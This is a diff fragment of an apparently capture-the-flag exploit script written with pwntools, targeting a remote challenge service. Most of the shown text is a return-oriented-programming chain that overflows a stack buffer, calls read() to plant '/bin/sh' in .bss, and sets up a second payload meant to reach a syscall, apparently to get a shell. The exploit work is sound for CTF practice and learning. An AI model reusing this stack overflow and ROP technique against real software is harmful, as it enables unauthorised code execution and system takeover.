@@ -29,14 +29,13 @@ vuln = elf.symbols['vuln']
 #p = process(elf.path)
 p = remote ("offsec.m0lecon.it", 13546)
 
-payload1 = flat(
-        #b'/bin/sh\x00', 
+payload1 = flat( 
         b'A' * OFFSET_TO_RIP,
         p64(ret),
         p64(pop_rdi_ret), p64(0),
         p64(pop_rsi_ret), p64(bss_addr),
         p64(pop_rdx_ret), p64(8),
-        p64(read_func), 
+        p64(read_func), #when this executes, the binary pauses and waits for 8 bytes p.send(b'/bin/sh\x00')
         p64(ret), 
         p64(vuln), 
         )
@@ -46,6 +45,7 @@ p.send(payload1)
 import time; time.sleep(0.3)
 p.send(b'/bin/sh\x00')
 
+#puts bss address into rdi, then execute syscall
 payload2 = flat(
         b'A' * OFFSET_TO_RIP,
         p64(ret), 
